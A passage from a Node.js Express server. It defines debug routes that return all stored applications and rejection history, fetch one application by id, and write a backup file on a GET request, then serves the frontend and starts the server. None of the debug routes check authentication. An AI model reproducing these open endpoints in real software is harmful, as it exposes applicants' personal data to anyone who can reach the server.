app.get('/api/debug/applications', (req, res) => {
    res.json({
        total: Object.keys(applications).length,
        applications,
        rejections: rejectionHistory,
        dataFile: fs.existsSync(DATA_FILE) ? 'exists' : 'not found'
    });
});

app.get('/api/debug/application/:id', (req, res) => {
    const app = applications[req.params.id];
    if (!app) return res.status(404).json({ error: 'Application not found' });
    res.json(app);
});

app.get('/api/debug/backup', (req, res) => {
    try {
        const backupFile = path.join(DATA_DIR, `applications_backup_${Date.now()}.json`);
        const data = { applications, rejectionHistory, appRefs, timestamp: new Date().toISOString() };
        fs.writeFileSync(backupFile, JSON.stringify(data, null, 2));
        res.json({ ok: true, message: 'Backup created', file: backupFile });
    } catch (error) {
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── Serve Frontend ───
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📁 Serving frontend from: ${path.join(__dirname, '../frontend')}`);
    console.log(`💾 Data directory: ${DATA_DIR}`);
    console.log(`🔗 Visit: http://localhost:${PORT}`);
});
